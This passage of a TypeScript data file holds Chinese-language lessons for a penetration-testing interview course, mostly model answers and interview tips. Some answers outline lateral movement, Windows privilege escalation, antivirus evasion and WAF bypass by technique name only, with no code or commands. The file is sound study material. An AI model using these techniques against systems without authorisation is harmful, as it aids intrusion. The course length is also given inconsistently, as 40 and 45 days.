    content: '# 渗透测试方向 — 全真模拟面试（二）：漏洞利用·内网渗透·提权免杀\n\n## 🎯 今日目标\n\n深度技术面试模拟，聚焦渗透测试方向的核心技术问题。\n\n---\n\n## 📋 高频技术面试题\n\n以下是面试中高频出现的技术问题，每道题都要能做到「流畅口述回答」而非「心里知道」。\n\n### Q1：描述一个完整的渗透测试流程。\n\n**参考答案**：信息收集(子域名/端口/指纹)→漏洞扫描(Nessus/AWVS)→漏洞利用(Metasploit/手工EXP)→后渗透(提权/内网横向/持久化)→权限维持→痕迹清理→报告撰写。红队还会加入社工和物理渗透。\n\n**口述练习要点**：\n- 用自己的话重新组织，不要背答案\n- 控制在2分钟内\n- 先给结论再展开，如"核心是三点：第一...第二...第三..."\n- 准备被追问的深度（面试官会追问"为什么""还有呢"）\n\n---\n\n### Q2：内网渗透中如何进行横向移动？\n\n**参考答案**：常用方法：Pass-the-Hash(PTH)、Pass-the-Ticket(PTT)、WMI/WinRM远程执行、PSExec、SMB共享利用、RDP横向。前提是先获取域内一台机器的权限，然后利用内网信任关系逐步扩大。\n\n**口述练习要点**：\n- 用自己的话重新组织，不要背答案\n- 控制在2分钟内\n- 先给结论再展开，如"核心是三点：第一...第二...第三..."\n- 准备被追问的深度（面试官会追问"为什么""还有呢"）\n\n---\n\n### Q3：Windows提权有哪些常见方法？\n\n**参考答案**：内核漏洞提权(MS16-032等)、服务提权(不安全的服务权限/未引号路径)、DLL劫持、UAC绕过、Token窃取、计划任务、AlwaysInstallElevated注册表、Potato系列(Juicy/Rotten/PrintSpoofer)。\n\n**口述练习要点**：\n- 用自己的话重新组织，不要背答案\n- 控制在2分钟内\n- 先给结论再展开，如"核心是三点：第一...第二...第三..."\n- 准备被追问的深度（面试官会追问"为什么""还有呢"）\n\n---\n\n### Q4：免杀技术的基本原理？\n\n**参考答案**：静态免杀：代码混淆/加密/加壳、修改特征码、无文件攻击。动态免杀：反沙箱(检测虚拟机/延时执行)、API Unhooking、进程注入、回调函数执行、DInvoke间接系统调用。\n\n**口述练习要点**：\n- 用自己的话重新组织，不要背答案\n- 控制在2分钟内\n- 先给结论再展开，如"核心是三点：第一...第二...第三..."\n- 准备被追问的深度（面试官会追问"为什么""还有呢"）\n\n---\n\n### Q5：你如何写一份专业的渗透测试报告？\n\n**参考答案**：结构：执行摘要(给管理层)→漏洞总览(按严重程度排序)→详细发现(漏洞名称/描述/复现步骤/截图/修复建议)→风险评级(CVSS评分)→附录(工具/命令清单)。关键：要有可操作的修复建议，不是只列漏洞。\n\n**口述练习要点**：\n- 用自己的话重新组织，不要背答案\n- 控制在2分钟内\n- 先给结论再展开，如"核心是三点：第一...第二...第三..."\n- 准备被追问的深度（面试官会追问"为什么""还有呢"）\n\n---\n\n## 🎭 模拟面试：角色扮演\n\n找一位朋友扮演面试官，或对着镜子/录音练习：\n\n1. 面试官："请做一个简短的自我介绍"（你的回答应与渗透测试方向相关）\n2. 面试官随机抽上面的1-2道题追问\n3. 面试官对回答进行3层追问，测试深度\n4. 结束后互评：哪些回答好？哪些需要补？\n\n---\n\n## 📊 技术面试自评\n\n| 题目 | 能口述回答？ | 能扛2层追问？ | 需要补充的知识 |\n|------|-------------|-------------|---------------|\n| 描述一个完整的渗透测试流程。... | □是 □否 | □是 □否 | |\n| 内网渗透中如何进行横向移动？... | □是 □否 | □是 □否 | |\n| Windows提权有哪些常见方法？... | □是 □否 | □是 □否 | |\n| 免杀技术的基本原理？... | □是 □否 | □是 □否 | |\n| 你如何写一份专业的渗透测试报告？... | □是 □否 | □是 □否 | |\n',
    quiz: []
  },
  {
    id: 'interview-pen-i43', day: 43, title: '全真模拟面试（三）', subtitle: '项目经验深挖·行为面试',
    objectives: ['项目讲述与行为面试'],
    keyPoints: ['项目STAR讲述','渗透报告','冲突解决','团队协作'],
    content: '# 渗透测试方向 — 全真模拟面试（三）：项目经验深挖·行为面试\n\n## 🎯 今日目标\n\n掌握STAR法则讲述项目经验，应对行为面试中的各类场景题。\n\n---\n\n## 📋 项目经验面试（STAR法则）\n\n### 面试题：请用STAR法则讲述一次渗透测试实战经历。\n\n**回答指引**：S: 客户系统(如某电商平台)。T: 模拟外部攻击者进行黑盒渗透。A: 信息收集→发现SQL注入→获取数据库→破解管理员密码→登录后台→上传WebShell→提权→内网横向。R: 发现X个高危漏洞，协助修复，客户安全评分提升Y%。\n\n---\n\n### 面试题：渗透过程中遇到WAF拦截怎么办？\n\n**回答指引**：思路：WAF指纹识别→编码绕过(URL/Unicode/Hex)→大小写变换→注释插入→分块传输→HTTP参数污染→切换协议(WebSocket)→利用CDN回源。展示你是系统性思考者而非靠运气。\n\n---\n\n### 面试题：如何评估一个漏洞的实际危害？\n\n**回答指引**：CVSS评分维度：攻击向量/复杂度/权限要求/用户交互/范围/机密性/完整性/可用性影响。结合业务上下文：该漏洞影响的系统存储什么数据？面向什么用户？是否有补偿控制？\n\n---\n\n## 🗣️ 行为面试常见问题\n\n**Q: "你最大的缺点是什么？"**\n\n> 不要说"我太追求完美"这样的假缺点。真诚但策略性地回答：选一个真实但不致命的缺点，然后强调你在如何改进。例如："我有时太专注于技术细节，在时间管理上需要加强。我现在的做法是用番茄钟设定硬性截止时间，效果不错。"\n\n**Q: "为什么离开上一家公司？"**\n\n> 向前看而非向后看。"在上一家公司学到了X和Y，但希望能有更多机会深入Z方向，这与贵团队的定位非常匹配。"\n\n**Q: "你未来的职业规划是什么？"**\n\n> 短期(1-2年)：深耕渗透测试技术，成为团队的技术骨干。中期(3-5年)：积累架构设计经验，能独立负责大型安全项目的方案设计和落地。长期(5年+)：成为渗透测试领域的专家，反哺社区和新人。\n\n---\n\n## ✅ 今日任务清单\n\n1. □ 准备2-3个STAR故事（每个3分钟版本）\n2. □ 对着镜子练习项目讲述，录音回听\n3. □ 准备3个"你有什么问题想问我们"的反问\n4. □ 与朋友做一次15分钟模拟行为面试\n',
    quiz: []
  },
  {
    id: 'interview-pen-i44', day: 44, title: '全真模拟面试（四）', subtitle: 'HR面·薪资谈判·职业规划',
    objectives: ['HR面试与谈薪'],
    keyPoints: ['职业规划','薪资谈判','企业文化','反问技巧'],
    content: '# 渗透测试方向 — 全真模拟面试（四）：HR面·薪资谈判·职业规划\n\n## 🎯 今日目标\n\n掌握HR面试的沟通策略和薪资谈判技巧。\n\n---\n\n## 💰 薪资谈判策略\n\n### 谈判前的准备\n\n- **市场调研**：了解目标公司/行业/城市的薪资范围（参考：Boss直聘/Lagou/脉脉/Glassdoor）\n- **自我定位**：渗透测试方向X年经验的市场价位是多少？\n- **底线/期望/理想**：设定三个数字（低于底线不考虑/合理期望/努力可达）\n- **替代方案BATNA**：如果这个Offer没谈成，你还有其他选择吗？\n\n### HR常见话术与应对\n\n| HR话术 | 真实含义 | 你的应对 |\n|--------|---------|----------|\n| "你的期望薪资是多少？" | 试探你的底线 | "我了解贵司在这个岗位的预算范围吗？"先把球踢回去 |\n| "我们内部有薪资体系，可能达不到你的期望" | 压价 | "除了base，能了解下总包包含哪些吗？年终/股票/补贴/培训" |\n| "我们很认可你，但需要看HC审批" | 可能在拖或者压价 | "理解，我这边也有其他面试在流程中，希望能尽快确认" |\n| "这个岗位的预算就是X" | 这就是上限了 | 如果X低于底线，礼貌拒绝；接近期望，可以谈其他福利(远程/弹性/培训预算) |\n\n### 总包(Total Package)谈判清单\n\n不是只谈月薪！可以谈的包括：\n- 基本工资(Base)\n- 年终奖/绩效奖金(Bonus) — 问清楚是几个月、什么考核标准\n- 股票/期权(RSU/Options) — 行权价、归属期、公司估值\n- 签字费(Sign-on Bonus)\n- 五险一金基数和比例\n- 培训预算/考证报销(如OSCP、CISSP考试费)\n- 弹性工作/远程办公\n- 带薪年假\n\n---\n\n## 🏢 企业文化适配\n\nHR面也是在评估你与企业文化的匹配度：\n\n**你需要了解的**：\n- 团队规模和组成（多少人？什么背景？）\n- 技术栈和工具链（用什么安全产品？）\n- 工作模式（敏捷/瀑布？每日站会？On-call机制？）\n- 晋升机制（职级体系？多久评估一次？）\n- 安全团队在公司的地位（向CTO汇报还是CISO？）\n\n---\n\n## 🙋 反问环节（一定要准备！）\n\n好的反问展示你的思考和关注点：\n\n**技术方向**：\n> "团队目前在渗透测试方面最大的安全挑战是什么？"\n> "安全团队未来的技术路线图是怎样的？"\n\n**个人发展**：\n> "这个岗位前3个月的期望是什么？"\n> "团队对新人的培养机制是怎样的？"\n\n**不要问的**：\n> ❌ "公司做什么的？"（面试前应该查过）\n> ❌ "加班多吗？"（问法可以改为"团队通常的工作节奏是怎样的"）\n',
    quiz: []
  },
  {
    id: 'interview-pen-i45', day: 45, title: '全真模拟面试（五）', subtitle: '终极模拟·综合评分·查漏补缺',
    objectives: ['全方位面试自评与查漏补缺'],
    keyPoints: ['综合评分卡','知识盲区盘点','面试话术打磨','最终自测'],
    content: '# 渗透测试方向 — 全真模拟面试（五）：终极模拟·综合评分·查漏补缺\n\n## 🎯 今日目标\n\n完成全方位面试自评，找出知识盲区，打磨面试话术，做最后一次全真模拟。\n\n---\n\n## 📋 综合面试评分卡\n\n按以下维度给自己打分（1-5分），≥3分才算合格，<3分的需要补强：\n\n| 维度 | 分数(1-5) | 自评 | 改进计划 |\n|------|-----------|------|----------|\n| 自我介绍(3分钟版) | ___ | | |\n| 技术基础问答 | ___ | | |\n| 深度技术追问 | ___ | | |\n| 项目经验讲述(STAR) | ___ | | |\n| 行为面试应对 | ___ | | |\n| 场景设计分析 | ___ | | |\n| 薪资谈判准备 | ___ | | |\n| HR交流策略 | ___ | | |\n| 反问问题准备 | ___ | | |\n| 整体自信度 | ___ | | |\n\n---\n\n## 🔍 渗透测试方向知识盲区盘点\n\n逐项检查以下知识领域，标记掌握程度（✅熟练 / ⚠️需要复习 / ❌完全不会）：\n\n- □ 渗透流程：能独立完成从信息收集到报告撰写的全流程吗？\n- □ 漏洞利用：对OWASP Top 10每种漏洞都有实际利用经验吗？\n- □ 内网渗透：做过域环境的横向移动和权限维持吗？\n- □ 工具链：熟练使用Burp/Metasploit/Cobalt Strike/Nmap等吗？\n- □ 编程能力：能用Python/Go/PowerShell编写渗透脚本吗？\n\n**行动计划**：把标记为⚠️和❌的项排优先级，用最后的时间突击补强。\n\n---\n\n## 🎭 终极全真模拟\n\n### 模拟设定\n\n- **时长**：45分钟（完整真实面试时长）\n- **角色**：你 = 渗透测试方向候选人 | 模拟面试官 = 朋友/同事/镜子中的自己\n- **流程**：自我介绍3分钟 → 技术问答15分钟 → 项目深挖10分钟 → 场景设计10分钟 → HR环节5分钟 → 反问2分钟\n\n### 模拟面试步骤\n\n1. **完整做一次45分钟模拟**，用手机录音全程\n2. **回听录音**，标注问题：哪卡壳了？哪回答得好？语速节奏如何？\n3. **针对性优化**：卡壳的地方补充知识，啰嗦的地方精简话术\n4. **再做一次**（至少做2轮），直到你能流畅完成\n\n---\n\n## 📝 面试话术打磨\n\n### 困难问题的「万能回答框架」\n\n**遇到不会的问题**：\n> "这是一个很好的问题。坦率地说，我在这个具体点上经验不多，但我对相关领域X和Y比较熟悉。我的理解是...（尝试从相关原理推导）。如果实际遇到这个问题，我的思路会是：首先查阅官方文档/Official RFC，然后搭建环境实验验证，最后结合业务场景给出方案。"\n\n**被问到失败的案例**：\n> "有一次在XX项目中，因为XX原因导致XX结果。我从中学到了XX（诚实+反思+成长）。之后我建立了XX机制来避免类似问题，在后来的项目中再也没有出现过。"\n\n---\n\n## 🎉 面试冲刺总结\n\n恭喜！你已经完成了45天的面试突击训练！最后几点提醒：\n\n1. **面试前一晚**：早睡，准备好衣服，查好路线，打印2份简历\n2. **面试当天**：提前15分钟到，深呼吸，保持微笑\n3. **面试中**：语速适中不要快，遇到不会的坦诚不编造，适时反问\n4. **面试后**：当天复盘记录问题，写感谢邮件\n5. **心态**：每一次面试都是一次学习，没有白面的面试\n\n> 祝你在渗透测试方向的面试中旗开得胜！🛡️\n',
    quiz: []
  }
];

export const interviewPenetrationPlan: CyberLearningPlan = {
  id: 'penetration',
  name: '渗透测试·面试突击',
  subtitle: 'Penetration Testing · 40 Days',
  description: '前26天全量知识速览 + 后14天面试实战。覆盖信息收集、Web漏洞、内网渗透、提权、红队攻击链、免杀、移动/IoT安全等全部渗透测试面试考点',
  icon: '🎯',
  difficulty: '进阶',
  totalDays: 45,
  color: 'text-cyber-red',
  bgColor: 'bg-cyber-red/10',
  borderColor: 'border-cyber-red/30',
  prerequisites: cyberPenetrationPlan.prerequisites,
  certification: cyberPenetrationPlan.certification,
  days: [...reviewDays, ...interviewDays],
};
